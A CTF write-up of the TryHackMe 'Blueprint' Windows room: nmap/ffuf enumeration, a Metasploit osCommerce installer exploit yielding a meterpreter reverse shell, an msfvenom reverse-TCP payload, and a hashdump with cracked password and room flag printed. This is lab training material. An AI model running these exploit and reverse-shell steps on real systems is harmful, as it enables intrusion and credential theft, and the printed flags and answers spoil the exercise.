## Blueprint - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/blueprint)

<i>Do you have what is takes to hack into this Windows Machine?

It might take around 3-4 minutes for the machine to boot.</i>

**IP: 10.10.10.69**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Windows, Metasploit <br>

**Tools Used**: Nmap, Ffuf, Metasploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and Ffuf. There is nothing on port 80 so I moved on to port 8080 directly.

  ```
  nmap -sC -sV -T5 -p- 10.10.10.69

  PORT      STATE    SERVICE      VERSION
  80/tcp    open     http         Microsoft IIS httpd 7.5
  |_http-server-header: Microsoft-IIS/7.5
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-title: 404 - File or directory not found.
  135/tcp   open     msrpc        Microsoft Windows RPC
  139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
  443/tcp   open     ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
  |_ssl-date: TLS randomness does not represent time
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
  | tls-alpn: 
  |_  http/1.1
  | ssl-cert: Subject: commonName=localhost
  | Not valid before: 2009-11-10T23:48:47
  |_Not valid after:  2019-11-08T23:48:47
  |_http-title: Index of /
  | http-ls: Volume /
  | SIZE  TIME              FILENAME
  | -     2019-04-11 22:52  oscommerce-2.3.4/
  | -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
  | -     2019-04-11 22:52  oscommerce-2.3.4/docs/
  |_
  445/tcp   open     microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
  3306/tcp  open     mysql        MariaDB 10.3.23 or earlier (unauthorized)
  8080/tcp  open     http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
  |_http-title: Index of /
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
  | http-ls: Volume /
  | SIZE  TIME              FILENAME
  | -     2019-04-11 22:52  oscommerce-2.3.4/
  | -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
  | -     2019-04-11 22:52  oscommerce-2.3.4/docs/
  |_
  28569/tcp filtered unknown
  36275/tcp filtered unknown
  47960/tcp filtered unknown
  49152/tcp open     msrpc        Microsoft Windows RPC
  49153/tcp open     msrpc        Microsoft Windows RPC
  49154/tcp open     msrpc        Microsoft Windows RPC
  49158/tcp open     msrpc        Microsoft Windows RPC
  49159/tcp open     msrpc        Microsoft Windows RPC
  49160/tcp open     msrpc        Microsoft Windows RPC
  Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb2-security-mode: 
  |   2:1:0: 
  |_    Message signing enabled but not required
  | smb-os-discovery: 
  |   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
  |   OS CPE: cpe:/o:microsoft:windows_7::sp1
  |   Computer name: BLUEPRINT
  |   NetBIOS computer name: BLUEPRINT\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2025-05-15T19:56:40+01:00
  |_clock-skew: mean: -28m59s, deviation: 34m37s, median: -9m00s
  |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:f0:a6:62:e9:d5 (unknown)
  | smb2-time: 
  |   date: 2025-05-15T18:56:40
  |_  start_date: 2025-05-15T18:48:21
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  ```

  ```
  ffuf -u http://10.10.10.69:8080/oscommerce-2.3.4/catalog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  images                  [Status: 301, Size: 368, Words: 22, Lines: 10, Duration: 1752ms]
  download                [Status: 401, Size: 1319, Words: 145, Lines: 48, Duration: 2232ms]
  pub                     [Status: 301, Size: 365, Words: 22, Lines: 10, Duration: 77ms]
  Images                  [Status: 301, Size: 368, Words: 22, Lines: 10, Duration: 79ms]
  admin                   [Status: 301, Size: 367, Words: 22, Lines: 10, Duration: 83ms]
  includes                [Status: 301, Size: 370, Words: 22, Lines: 10, Duration: 95ms]
  install                 [Status: 301, Size: 369, Words: 22, Lines: 10, Duration: 154ms]
  Download                [Status: 401, Size: 1319, Words: 145, Lines: 48, Duration: 152ms]
  ext                     [Status: 301, Size: 365, Words: 22, Lines: 10, Duration: 397ms]
  INSTALL                 [Status: 301, Size: 369, Words: 22, Lines: 10, Duration: 56ms]
  IMAGES                  [Status: 301, Size: 368, Words: 22, Lines: 10, Duration: 147ms]
  %20                     [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 85ms]
  Admin                   [Status: 301, Size: 367, Words: 22, Lines: 10, Duration: 143ms]
  *checkout*              [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 3387ms]
  Install                 [Status: 301, Size: 369, Words: 22, Lines: 10, Duration: 1210ms]
  *docroot*               [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 92ms]
  DOWNLOAD                [Status: 401, Size: 1319, Words: 145, Lines: 48, Duration: 474ms]
  *                       [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 2786ms]
  con                     [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 2237ms]
  http%3A                 [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 556ms]
  Includes                [Status: 301, Size: 370, Words: 22, Lines: 10, Duration: 154ms]
  **http%3a               [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 2493ms]
  aux                     [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 643ms]
  *http%3A                [Status: 403, Size: 1044, Words: 102, Lines: 43, Duration: 225ms]
  ```
  
- I canceled it because it took soooo long, thankfully this was enough to finish the CTF. When you visit `http://10.10.10.69:8080/oscommerce-2.3.4/catalog/install/`, you will find a oscommerce version. So yeah, it was enough.

   ```Welcome to osCommerce Online Merchant v2.3.4!```
  
- So when it comes to Windows, Metasploit is your best friend so let's check it out.

---

## ⚙️ Shell Access

- Start Metasploit and search for oscommerce.

  ```
  msf6 > search oscommerce

  Matching Modules
  ================
  
     #  Name                                                      Disclosure Date  Rank       Check  Description
     -  ----                                                      ---------------  ----       -----  -----------
     0  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution
     1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
  ```
  
- Perfect, this is the one that we need `exploit/multi/http/oscommerce_installer_unauth_code_exec` so let's check it.

  ```
  msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

  Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):
  
     Name     Current Setting    Required  Description
     ----     ---------------    --------  -----------
     Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                           basics/using-metasploit.html
     RPORT    80                 yes       The target port (TCP)
     SSL      false              no        Negotiate SSL/TLS for outgoing connections
     URI      /catalog/install/  yes       The path to the install directory
     VHOST                       no        HTTP server virtual host
  
  
  Payload options (php/meterpreter/reverse_tcp):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST                   yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   osCommerce 2.3.4.1
  
  
  
  View the full module info with the info, or info -d command.
  ```
  
- Set the required parameters and run the exploit, you should get meterpreter shell.

  ```
  msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set lhost [YOUR-THM-IP]
  lhost => [YOUR-THM-IP]
  msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set rport 8080
  rport => 8080
  msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set rhosts 10.10.10.69
  rhosts => 10.10.10.69
  msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install/
  URI => /oscommerce-2.3.4/catalog/install/
  msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:4444 
  [*] Sending stage (40004 bytes) to 10.10.10.69
  [*] Meterpreter session 1 opened ([YOUR-THM-IP]:4444 -> 10.10.10.69:49479) at 2025-05-15 21:01:10 +0100
  
  
  meterpreter > getuid
  Server username: SYSTEM
  meterpreter > hashdump
  [-] The "hashdump" command requires the "priv" extension to be loaded (run: `load priv`)
  ```

---

## 🧍 User Privilege Escalation

- In order to dump hashes we will need to escalate to Administrator, but you can read the root flag now.

  ```
  meterpreter > dir
  Listing: C:\Users\Administrator\Desktop
  =======================================
  
  Mode              Size           Type  Last modified                      Name
  ----              ----           ----  -------------                      ----
  100666/rw-rw-rw-  1211180777754  fil   211641783000-06-29 17:21:19 +0100  desktop.ini
  100666/rw-rw-rw-  158913789989   fil   214344271123-10-28 09:41:29 +0000  root.txt.txt
  
  meterpreter > cat root.txt.txt
  THM{aea1e3ce6fe7f89e10cea833ae009bee}
  ```
  
- Now let's create a more stable shell and finish the job.

---

## 👑 Root Privilege Escalation

- First we need to create a payload with Msfvenom.

  ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR-THM-IP] LPORT=7777 -f exe > shell.exe```
  
- Now in another terminal start Metasploit again and run a multi handler exploit.

  ```
  msf6 > use multi/handler
  [*] Using configured payload generic/shell_reverse_tcp
  msf6 exploit(multi/handler) > show options
  
  Payload options (generic/shell_reverse_tcp):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST                   yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   Wildcard Target
  
  
  
  View the full module info with the info, or info -d command.
  
  msf6 exploit(multi/handler) > set lhost [YOUR-THM-IP]
  lhost => [YOUR-THM-IP]
  msf6 exploit(multi/handler) > set lport 7777
  lport => 7777
  msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf6 exploit(multi/handler) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:7777 
  ```
  
- Now get back to previous Metasploit session, upload the newly created shell and execute it. After execution you will get a new connection as Administrator on your multi handler.

  ```
  meterpreter > upload shell.exe
  [*] Uploading  : [SNIP!]
  [*] Uploaded -1.00 B of 72.07 KiB (-0.0%): [SNIP!]
  [*] Completed  : [SNIP!]
  meterpreter > ls
  Listing: C:\Users\Administrator\Desktop
  =======================================
  
  Mode              Size             Type  Last modified                      Name
  ----              ----             ----  -------------                      ----
  100666/rw-rw-rw-  1211180777754    fil   211641783000-06-29 17:21:19 +0100  desktop.ini
  100666/rw-rw-rw-  158913789989     fil   214344271123-10-28 09:41:29 +0000  root.txt.txt
  100777/rwxrwxrwx  316977176453194  fil   237816259415-06-16 14:07:17 +0100  shell.exe
  
  meterpreter > execute -f shell.exe
  Process 10460 created.
  ```

  ```
  msf6 exploit(multi/handler) > run
  [*] Started reverse TCP handler on [YOUR-THM-IP]:7777 
  [*] Sending stage (177734 bytes) to 10.10.10.69
  [*] Meterpreter session 2 opened ([YOUR-THM-IP]:7777 -> 10.10.10.69:49485) at 2025-05-15 21:16:30 +0100
  
  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  ```

- Awesome, now dump them hashes and crack it to finish the job.

  ```
  meterpreter > hashdump
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
  meterpreter > 
  
  30e87bf999828446a1c1209ddde4c450 -> googleplus
  ```

- I love me some Metasploit practice!
  
---

## 🏁 Flags

- **Lab user NTLM hash decrypted**: `googleplus`
- **Root Flag**: `THM{aea1e3ce6fe7f89e10cea833ae009bee}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, I expected much more from Windows machine honestly.`

- What did I learn?
  `To change the payload in Metasploit...`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
